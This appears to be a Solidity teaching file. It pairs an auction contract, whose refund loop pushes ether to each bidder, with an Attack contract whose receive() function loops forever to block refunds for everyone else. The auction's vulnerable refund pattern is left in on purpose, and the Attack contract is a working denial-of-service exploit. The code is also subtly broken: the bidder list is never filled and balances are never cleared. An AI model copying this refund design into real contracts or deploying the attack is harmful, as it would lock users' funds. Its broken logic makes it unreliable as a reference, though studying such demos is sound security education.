// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "hardhat/console.sol";

contract Auction {
    mapping(address => uint) public bidders;
    address[] public allBidders;
    uint public refundProgress;
    address[] public failedRefunds;  // an array of addresses to which, for one reason or another, it was not possible to withdraw money

    function bid() external payable {
        bidders[msg.sender] += msg.value;
    }

    function refund() external {
        for(uint i = refundProgress; i < allBidders.length; i++) {
            console.log(refundProgress);

            address nextBidder = allBidders[i];
            console.log(nextBidder);
           
            (bool success,) = nextBidder.call{value: bidders[nextBidder]}("");
            if(!success) {
                failedRefunds.push(nextBidder);
            }

            console.log("next refund");
            
            refundProgress++;
        }
    }
}


contract Attack {
    Auction auction;
    bool doHack = true;
    address payable owner;

    constructor(address _auction) {
        auction = Auction(_auction);
        owner = payable(msg.sender);
    }

    function doBid() external payable {
        auction.bid{value: msg.value}();
    }

    function toggleHacking() external {
        require(msg.sender == owner, "fail");
        doHack = !doHack;
    }

    receive() external payable {
        if(doHack == true) {
        while(true) {}
        } else {
            (bool success,) = owner.call{value: msg.value}("");
            require(success, "failed!");
        }
    }
}
